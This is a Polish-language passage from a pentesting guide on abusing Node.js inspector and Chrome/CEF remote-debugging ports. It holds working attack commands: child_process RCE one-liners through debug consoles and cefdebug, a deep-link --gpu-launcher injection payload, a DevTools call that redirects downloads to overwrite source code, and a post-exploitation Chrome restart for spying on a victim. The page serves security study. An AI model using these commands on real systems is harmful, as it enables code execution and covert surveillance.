# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Informacje podstawowe

[Z dokumentacji](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Po uruchomieniu z przełącznikiem `--inspect` proces Node.js nasłuchuje na połączenia klienta debugującego. **Domyślnie** nasłuchuje na hoście i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikalny** **UUID**.

Klienci Inspector muszą znać i określić adres hosta, port oraz UUID, aby nawiązać połączenie. Pełny URL będzie wyglądać mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Ponieważ **debugger ma pełny dostęp do środowiska wykonawczego Node.js**, złośliwy aktor, który może połączyć się z tym portem, może mieć możliwość wykonania dowolnego kodu w imieniu procesu Node.js (**potential privilege escalation**).

Istnieje kilka sposobów uruchomienia Inspectora:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Po uruchomieniu inspekcjonowanego procesu pojawi się coś takiego:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesy oparte na **CEF** (**Chromium Embedded Framework**) wymagają użycia parametru: `--remote-debugging-port=9222`, aby otworzyć **debugger** (zabezpieczenia przed SSRF pozostają bardzo podobne). Jednak zamiast udostępniać sesję **debug** **NodeJS**, będą komunikować się z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), czyli interfejsu do sterowania przeglądarką, ale nie zapewnia to bezpośredniego RCE.

Po uruchomieniu debugowanej przeglądarki pojawi się coś takiego:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Przeglądarki, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w przeglądarce mogą wykonywać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest konieczne do **uzyskania unikalnego identyfikatora sesji debuggera**. **same-origin-policy** **uniemożliwia** stronom internetowym nawiązanie **tego połączenia HTTP**. W celu dodatkowej ochrony przed [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js sprawdza, czy **nagłówki „Host”** połączenia wskazują dokładnie **adres IP**, **`localhost`** lub **`localhost6`**.

> [!TIP]
> Te **środki bezpieczeństwa uniemożliwiają wykorzystanie inspectora** do uruchamiania kodu poprzez **samo wysłanie żądania HTTP** (co można by zrobić, wykorzystując SSRF vuln).

### Uruchamianie inspectora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu nodejs, aby uruchomić **inspector** na domyślnym porcie. Pamiętaj jednak, że musisz mieć wystarczające uprawnienia, więc może to zapewnić **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednią eskalację uprawnień.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Jest to przydatne w kontenerach, ponieważ **zatrzymanie procesu i uruchomienie nowego** z opcją `--inspect` **nie wchodzi w grę**, gdyż **kontener** zostanie **zabity** razem z procesem.

### Łączenie z inspector/debugger

Aby połączyć się z przeglądarką opartą na **Chromium**, można uzyskać dostęp do adresów `chrome://inspect` lub `edge://inspect`, odpowiednio dla Chrome lub Edge. Po kliknięciu przycisku Configure należy upewnić się, że **docelowy host i port** są prawidłowo wymienione. Obraz przedstawia przykład Remote Code Execution (RCE):

![Po pojawieniu się adresu URL umożliwiającego dostęp do debuggera, np. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Łączenie z inspector/debugger: Aby połączyć się z przeglądarką opartą na Chromium,...](<../../images/image (674).png>)

Za pomocą **wiersza poleceń** można połączyć się z debuggerem/inspectorem za pomocą:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) umożliwia **znajdowanie inspektorów** uruchomionych lokalnie oraz **wstrzykiwanie kodu** do nich.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Należy pamiętać, że exploity **RCE** w **NodeJS** nie zadziałają, jeśli połączenie z przeglądarką zostało nawiązane za pośrednictwem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (należy sprawdzić API, aby znaleźć interesujące możliwości jego wykorzystania).

## RCE w NodeJS Debugger/Inspector

> [!TIP]
> Jeśli trafiłeś tutaj, szukając sposobu na uzyskanie [**RCE z XSS w Electron, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Typowe sposoby uzyskania **RCE**, gdy można **połączyć się** z **inspector** Node, obejmują użycie czegoś takiego (wygląda na to, że **nie zadziała to w połączeniu z Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API można sprawdzić tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
W tej sekcji wymienię interesujące przykłady wykorzystania tego protocol przez osoby atakujące.

### Parameter Injection via Deep Links

W [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) firma Rhino Security odkryła, że aplikacja oparta na CEF **zarejestrowała niestandardowy UR**I w systemie (workspaces://index.html), który odbierał pełny URI, a następnie **uruchamiał aplikacj**ę opartą na CEF z konfiguracją częściowo konstruowaną na podstawie tego URI.

Odkryto, że parametry URI były dekodowane za pomocą URL i używane do uruchamiania podstawowej aplikacji CEF, co pozwalało użytkownikowi **wstrzyknąć** flagę **`--gpu-launcher`** do **command line** i wykonywać dowolne rzeczy.

Zatem payload taki jak:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wykona calc.exe.

### Nadpisywanie plików

Zmień folder, w którym będą zapisywane **pobrane pliki**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

Zgodnie z tym postem: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) możliwe jest uzyskanie RCE i przeprowadzenie exfiltration wewnętrznych stron z theriver.

### Post-Exploitation

W rzeczywistym środowisku, **po przejęciu** komputera użytkownika korzystającego z przeglądarki opartej na Chrome/Chromium, można uruchomić proces Chrome z **włączonym debuggingiem i przekierować port debuggingu**, aby uzyskać do niego dostęp. Dzięki temu będzie można **monitorować wszystko, co ofiara robi w Chrome, oraz kraść poufne informacje**.

Stealthowym sposobem jest **zakończenie każdego procesu Chrome**, a następnie wywołanie czegoś takiego jak
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referencje

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
